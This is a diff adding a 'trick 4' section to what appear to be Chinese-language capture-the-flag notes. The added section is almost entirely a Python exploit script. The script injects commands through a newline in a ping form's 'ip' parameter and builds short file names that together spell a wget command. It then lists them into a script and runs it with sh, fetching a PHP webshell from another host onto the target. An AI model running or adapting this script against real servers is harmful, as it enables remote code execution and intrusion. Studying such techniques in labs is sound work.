@@ -44,3 +44,51 @@ for i in ls:
 
 path是写入的路径 URL是获取的文件的路径 打印的是写入的路径 所以我们一次是是写不出shell的
 首先将此文件写出去 然后利用path特性种马即可
+
+# trick 4
+这道题目本地复现的时候出现了很多问题，post传参方式不同也会影响结果
+```
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import requests
+def GetShell():
+    s=requests.session()
+    url = "http://192.168.43.165/ping.php"
+    url1 = "http://192.168.60.128/web200-3/src/"
+    header = {
+        "Content-Type":"application/x-www-form-urlencoded"
+    }
+    data1={'username':'a','password[]':'a'}
+    # s.post(url1,data=data1,headers=header)
+    '''
+    wget\\
+    \ 19\\
+    2.\\
+    16\\
+    8.\\
+    60.\\
+    12\\
+    8\ \\
+    1.php\ \\
+    -O\ \\
+    2.php
+    '''
+    fileNames = ["2.php", "-O\ \\\\", "1.php\ \\","8\ \\\\", "12\\\\", "60.\\\\", "8.\\\\", "16\\\\","2.\\\\", "\ 19\\\\", "wget\\\\"]
+   # 多出的\只是为了充填，无论几个\都是一样的作用
+    ip = "0.0.0.1%0a"
+    for fileName in fileNames:
+        createFileIp = ip + ">" + fileName
+        print createFileIp
+        data = "ip=" + createFileIp#这里不知道为什么普通的传参不行
+        s.post(url, data=data,headers=header,)
+    getShIp = ip + "ls%20-t>1"  #新生成的文件输入进1中
+    print getShIp
+    data = "ip=" + getShIp
+    s.post(url, data=data,headers=header)
+    getShellIp = ip + "sh%201" # 执行1这个脚本
+    print getShellIp
+    data = "ip=" + getShellIp
+    s.post(url, data=data,headers=header)
+if __name__ == "__main__":
+    GetShell()
+```
